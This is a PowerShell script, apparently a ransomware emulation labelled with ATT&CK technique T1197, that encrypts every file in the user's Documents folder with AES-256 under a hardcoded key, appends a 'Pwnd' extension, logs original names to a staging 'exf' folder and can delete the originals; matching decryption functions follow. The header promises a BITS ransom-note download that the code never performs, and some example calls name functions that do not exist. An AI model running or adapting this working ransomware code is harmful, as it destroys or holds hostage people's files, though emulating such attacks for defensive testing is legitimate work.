# Donwload Ransom Note and stores it on User's Desktop 
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload RansomWare Note using Bitsadmin (T1197)"
Write-Output "==============================================================================="
################ [ VARIABLES ] ################
$DirectoryPath  = "$env:USERPROFILE\Documents";
$FilesMgmt      = "$env:PUBLIC\exf\Files_mgmt.txt";
$EncryptionKey  = "Encrypt!on-K3y"
$NewExtension   = "Pwnd"

function encrypt_files {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DirectoryPath
        #    [string]$OutputFile = "hashes.txt"
    )

    # Check if directory exists
    if (-not (Test-Path $DirectoryPath)) {
        Write-Host "Directory can not be find." 
        exit
    }

$sha256 = [System.Security.Cryptography.SHA256]::create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($EncryptionKey));

#Creation  AES Object
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Key = $key
$aes.GenerateIV()
$iv = $aes.IV

foreach ($file in Get-ChildItem $DirectoryPath)
{
    $FileName=$file.FullName;
    $FileCheckSum = Get-FileHash -Path $FileName -Algorithm SHA256
    Get-Content -Path $FileName -TotalCount 1 | Out-null;
    $NewFileName=$FileName+"."+$NewExtension
    Rename-Item -Path $file.FullName -NewName $NewFileName;
    # Read File content
    $PlainBytes = [System.IO.file]::ReadAllBytes($NewFileName);
   
#    $PlainBytes = [System.IO.file]::ReadAllBytes($FileName);
    # Create Encryptor
    $Encryptor = $aes.CreateEncryptor()
    # Encrypt Data
    $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
    # Merge IV + Encrypted Data
    $FinalBytes = $iv + $EncryptedBytes
    # Write Encrypted File
    [System.IO.File]::WriteAllBytes($NewFileName,$FinalBytes)
    Write-host "Original filename             : " $FileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Original File SHA256 checksum : " $($FileCheckSum.Hash)  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host "Encrypted Filename            : " $NewFileName  | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append    
    Write-host ""
}
}

function remove_double_extension {
$MatchEndingExtension = "\."+$NewExtension+"$"

$files = Get-ChildItem -Path $DirectoryPath -File | Where-Object { $_.Name -match $MatchEndingExtension }

foreach ($file in $files) {
    $newName = $file.Name -replace $MatchEndingExtension, ''
    $newPath = Join-Path $file.DirectoryName $newName
    Rename-Item -Path $file.FullName -NewName $newPath
    Write-Host "Renamed file : $($file.Name) -> $newName"
}
}

################ [ SCRIPT ] ################

################ [ TESTS ] ################

# Fonction pour chiffrer un fichier avec AES
function EncryptFileAES {
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputFile,
        
        [Parameter(Mandatory=$true)]
        [string]$OutputFile,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$IVParameter
    )
    
    try {
        # Create AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $IVParameter
                     Write-Host "IV bytes : $IvParameter" -ForegroundColor Gray
        # Create Encryptor
        $encryptor = $aes.CreateEncryptor()
        
        # Read Source file
        $inputBytes = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Encrypt File content
        $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.Length)
        
        # Write encrypted file (IV + encrypted data)
        $outputBytes = $IVParameter + $encryptedBytes
        [System.IO.File]::WriteAllBytes($OutputFile, $outputBytes)
        
        # Cleanup process
        $encryptor.Dispose()
        $aes.Dispose()
        
        Write-Host "Successfully Encrypted File : $InputFile -> $OutputFile" | Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append
        return $true
    }
    catch {
        Write-Host "Encryption failure for file : $InputFile error code : $($_.Exception.Message)"| Out-File -FilePath "$FilesMgmt" -Encoding ascii -Append
        return $false
    }
}

# Fonction pour générer une clé à partir d'un mot de passe
function GetKeyFromPassword {
    param(
        [Parameter(Mandatory=$true)]
        [String]$Password,
        [byte[]]$Salt = @(0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76),
        
        [int]$Iterations = 10000
    )
    
    $rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, $Iterations)
    return $rfc2898.GetBytes(32) # 256 bits pour AES-256
}

# Script principal
function EncryptFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath,
        
    #    [Parameter(Mandatory=$true)]
        [string]$Password = $EncryptionKey,

        
        [string]$FileFilter = "*.*",
        
        [switch]$Recursive,
        
        [switch]$DeleteOriginal,
        
        [string]$OutputSuffix = "."+$NewExtension
    )
    
    # Vérifier que le répertoire existe
    if (-not (Test-Path $DirectoryPath)) {
        Write-Error "Directory :  '$DirectoryPath' does not exist or can not be accessed."
        return
    }
    
    # Générer la clé à partir du mot de passe
    Write-Host "Computing encryption key ..." -ForegroundColor Yellow
    $key = GetKeyFromPassword -Password $Password
    
    # Obtenir la liste des fichiers
    $searchOption = if ($Recursive) { "AllDirectories" } else { "TopDirectoryOnly" }
    
    try {
        $files = Get-ChildItem -Path $DirectoryPath -Filter $FileFilter -File -Recurse:$Recursive
        
        if ($files.Count -eq 0) {
            Write-Warning "No file has been found with the selected extension : '$FileFilter' in directory : '$DirectoryPath'"
            return
        }
        
        Write-Host "Number of files to encrypt : $($files.Count)" -ForegroundColor Cyan
        
        $successCount = 0
        $errorCount = 0
        
        foreach ($file in $files) {
            # Ignore already encrypted files.
            if ($file.Name.EndsWith($OutputSuffix)) {
                Write-Host "File $($file.Name) is already encrypted." -ForegroundColor Gray
                continue
            }
            
            # Compute an IV for each file
            $aes = [System.Security.Cryptography.Aes]::Create()
            $IvAES = $aes.IV
            $aes.Dispose()
            
            # Defines output file name.
            $outputFile = $file.FullName + $OutputSuffix
             Write-Host "IV bytes : $IvAES" -ForegroundColor Gray
            # Encrypt File
            if (EncryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key -IVParameter $IvAES) {
                $successCount++
                
                # Remove orignal file if mentioned.
                if ($DeleteOriginal) {
                    try {
                        Remove-Item $file.FullName -Force
                        Write-Host "  ---> Original file" $file.FullName" has been deleted." -ForegroundColor Yellow
                    }
                    catch {
                        Write-Warning "Unable to delete orignal file?=. Error :  $($_.Exception.Message)"
                    }
                }
            }
            else {
                $errorCount++
            }
        }
        
        Write-Host "`n=== RÉSUMÉ ===" -ForegroundColor Magenta
        Write-Host "Number of files encrypted                                  : $successCount" -ForegroundColor Green
        Write-Host "Number of Errors encountered during the encryption process : $errorCount" -ForegroundColor Red
        
    }
    catch {
        Write-Error "Error occured during directory management : $($_.Exception.Message)"
    }
}

# Exemple d'utilisation
# Encrypt-DirectoryFiles -DirectoryPath "C:\MonDossier" -Password "MonMotDePasseSecurise123!" -FileFilter "*.txt" -Recursive

# Fonction to decrypt a file.
function DecryptFileAES {
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputFile,
        
        [Parameter(Mandatory=$true)]
        [string]$OutputFile,
        
        [Parameter(Mandatory=$true)]
        [byte[]]$Key
    )
    
    try {
        # Read encrypted file
        $encryptedData = [System.IO.File]::ReadAllBytes($InputFile)
        
        # Extract IV (16 first bytes)
        $iv = $encryptedData[0..15]
        $cipherText = $encryptedData[16..($encryptedData.Length - 1)]
        
        # Compute AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.IV = $iv
        
        # Decrytpor creation
        $decryptor = $aes.CreateDecryptor()
        
        # Decrypt data
        $decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)
        
        # Write decrypted file
        [System.IO.File]::WriteAllBytes($OutputFile, $decryptedBytes)
        
        # Cleanup
        $decryptor.Dispose()
        $aes.Dispose()
        
        Write-Host "Decrypted file : $InputFile -> $OutputFile" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Error while decrypting file $InputFile : $($_.Exception.Message)"
        return $false
    }
}



# Function to decrypt a directory
function DecryptFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$DirectoryPath,
        
        #[Parameter(Mandatory=$true)]
        [string]$Password = $EncryptionKey,
        $MatchEndingExtension = "\."+$NewExtension+"$",       
        [string]$EncryptedSuffix =  "."+$NewExtension,
        
        [switch]$Recursive,
        
        [switch]$DeleteEncrypted
    )
    
    $key = GetKeyFromPassword -Password $Password
    $files = Get-ChildItem -Path $DirectoryPath -Filter "*$EncryptedSuffix" -File -Recurse:$Recursive
    
    foreach ($file in $files) {
        
        $outputFile = $file.FullName -replace $MatchEndingExtension, ''

        
        if (DecryptFileAES -InputFile $file.FullName -OutputFile $outputFile -Key $key) {
            if ($DeleteEncrypted) {
                Remove-Item $file.FullName -Force
                Write-Host "     Encrypted file "$file.FullName" has been deleted" -ForegroundColor Yellow
            }
        }
    }
}
# Chiffrer tous les fichiers .txt dans un dossier
#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -FileFilter "*.txt"

# Chiffrer récursivement tous les fichiers et supprimer les originaux
#EncryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -Recursive -DeleteOriginal

# Déchiffrer les fichiers
#DecryptDirectoryFiles -DirectoryPath "C:\DirectoryName" -Password "MotDePasseSecurise123!" -Recursive

#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.txt"

#EncryptFiles -DirectoryPath "C:\xxxx" -FileFilter "*.pdf" -DeleteOriginal

# DecryptFiles -DirectoryPath "C:\xxxx" -Recursive 
# DecryptFiles -DirectoryPath "C:\xxxx" -Recursive -DeleteEncrypted